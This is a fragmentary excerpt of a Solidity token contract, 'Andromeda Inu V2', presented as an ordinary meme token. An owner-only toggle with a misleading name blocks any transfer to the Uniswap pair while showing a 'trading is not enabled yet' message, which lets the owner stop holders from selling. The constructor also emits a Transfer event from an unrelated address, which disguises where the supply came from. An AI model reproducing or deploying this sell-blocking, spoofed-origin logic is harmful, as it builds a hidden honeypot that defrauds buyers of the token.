...
/*
Andromeda Inu is reborn after a rough start because space is cool
       .                .                    
       :"-.          .-";                    
       |:`.`.__..__.'.';|                    
       || :-"      "-; ||                    
...
contract AndromedaInuV2 is  Context, IERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    string private constant _name = "Andromeda Inu V2";
    string private constant _symbol = "ANDROMEDA";
    uint8 private constant _decimals = 9;

    uniSwapRouter02 public uniSwapRouter;
    address public  uniSwapPair;

    bool private _antibbc = true; 
    ...
    event antibbcUpdate(bool enabled);
    ...
    constructor() {
        _feeAddrWallet1 = payable(0x4cC716447E86FcdAceA7a398A117cF06051FF3CD);
        _feeAddrWallet2 = payable(0x4cC716447E86FcdAceA7a398A117cF06051FF3CD);
        ...
        emit Transfer(address(0xdEcbD9B2D1b4311c0bE09DD40A667C3198bFb8C0), _msgSender(), _tTotal);
    }
    ...
    function _transfer(
        ...
        if (!_antibbc) {
            require(to != uniSwapPair, "ERC20: trading is not enabled yet");
        }
    ...
    function antibbcStatus(bool _state) public onlyOwner {
        _antibbc = _state;
        emit antibbcUpdate(_state);
    }
